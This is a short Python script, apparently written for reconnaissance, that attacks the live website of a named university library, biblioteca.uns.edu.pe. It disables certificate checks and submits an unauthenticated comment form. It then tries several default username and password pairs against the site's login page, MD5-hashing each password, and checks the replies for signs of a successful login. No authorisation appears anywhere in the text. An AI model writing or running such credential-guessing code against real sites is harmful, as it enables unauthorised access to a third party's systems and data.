import requests, urllib3, re
urllib3.disable_warnings()
h = {'User-Agent': 'Mozilla/5.0'}

BASE = "https://biblioteca.uns.edu.pe"

print("="*60)
print("SUPERFICIE DE ATAQUE: biblioteca.uns.edu.pe")
print("="*60)

# Test 1: Submit registra_comentario.asp without auth
print("\n[1] Registra Comentario - sin autenticacion:")
data = {'nombre': 'Test User', 'mail': 'test@test.com', 'pregunta': 'Hola esto es una prueba de comentario'}
r = requests.post(BASE + "/registra_comentario.asp", data=data, headers=h, verify=False, timeout=8)
print(f"  POST resultado: status={r.status_code}, len={len(r.content)}")
clean = re.sub(r'<[^>]+>', ' ', r.text)
lines = [l.strip() for l in clean.splitlines() if l.strip()]
for line in lines[15:30]:
    print(f"  {line}")

# Test 2: Try login.asp con credenciales por defecto simples
print("\n[2] Login.asp - prueba bypass sencillo:")
for creds in [('admin', 'admin'), ('biblio', 'biblio'), ('biblioteca', 'biblioteca'), ('admin', '')]:
    import hashlib
    md5_pass = hashlib.md5(creds[1].encode()).hexdigest() if creds[1] else ''
    data = {'t_usuario': creds[0], 't_clave': md5_pass, 'modo': 'U', 'B1': 'Iniciar+Sesion'}
    r = requests.post(BASE + "/login.asp", data=data, headers=h, verify=False, timeout=8, allow_redirects=True)
    clean = re.sub(r'<[^>]+>', ' ', r.text)
    lines = [l.strip() for l in clean.splitlines() if l.strip()]
    # Check for signs of logged in
    redirected = any(kw in r.url.lower() for kw in ['menu', 'panel', 'inicio', 'home', 'main'])
    success_kw = any(kw in r.text.lower() for kw in ['bienvenido', 'menu', 'panel', 'sesion iniciada', 'salir'])
    login_kw = any(kw in r.text.lower() for kw in ['error', 'invalido', 'incorrect', 'contraseña incorrecta', 'no existe'])
    print(f"  {creds[0]}:{creds[1]} -> status={r.status_code}, url={r.url}, success={success_kw}, error={login_kw}")
